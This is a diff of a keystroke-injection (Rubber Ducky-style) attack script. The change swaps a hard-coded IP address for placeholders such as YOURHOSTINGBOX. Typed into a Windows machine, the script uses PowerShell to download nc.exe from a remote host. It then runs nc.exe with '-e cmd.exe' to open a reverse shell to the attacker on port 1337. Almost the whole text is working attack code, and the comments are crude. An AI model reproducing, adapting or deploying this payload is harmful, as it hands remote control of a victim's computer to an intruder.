@@ -13,12 +13,12 @@ REM begin downloading nc.exe
 STRING $c = new-object System.Net.WebClient
 ENTER
 DELAY 100
-STRING $c.DownloadFile("http://185.207.205.144/nc.exe",".\Downloads\nc.exe")
+STRING $c.DownloadFile("http://YOURHOSTINGBOX/nc.exe",".\Downloads\nc.exe")
 ENTER
 DELAY 220
 REM done with that
 REM execute nc.exe with a reverse shell pointed at myself
 REM reverse shell must be listening first dipshit
-STRING ./Downloads/nc.exe -e C:\Windows\System32\cmd.exe 185.207.205.144 1337
+STRING ./Downloads/nc.exe -e C:\Windows\System32\cmd.exe YOURLISTENINGBOX 1337
 ENTER
 REM thats all folks
